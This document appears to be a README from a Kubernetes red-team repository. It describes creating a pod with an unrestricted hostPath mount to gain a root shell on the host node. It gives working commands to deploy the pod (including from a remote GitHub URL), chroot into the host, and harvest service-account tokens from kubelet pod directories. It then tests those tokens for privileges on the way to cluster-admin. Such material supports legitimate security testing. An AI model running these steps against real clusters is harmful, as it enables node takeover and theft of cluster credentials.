# You can create a pod with only a hostpath mount, but it is unrestricted 
If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 

[pod-hostpath-only.yaml](pod-hostpath-only.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-hostpath-only.yaml  
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpath-only/pod-hostpath-only.yaml  
```

### Exec into pod 
```bash
kubectl -n [namespace] exec -it pod-hostpath-only -- chroot /host

```

### Post exploitation
```bash
# You now have read/write access to the nodes's filesystem, mounted in /host within your pod. 
cd /host

# Example privesc path: Hunt for tokens in /host/var/lib/kubelet/pods/
tokens=`find /host/var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort

default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token

#Copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
DTOKEN=`cat /host/var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions

# Does the token allow you to view secrets in that namespace? How about other namespaces?
# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
```
   
Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/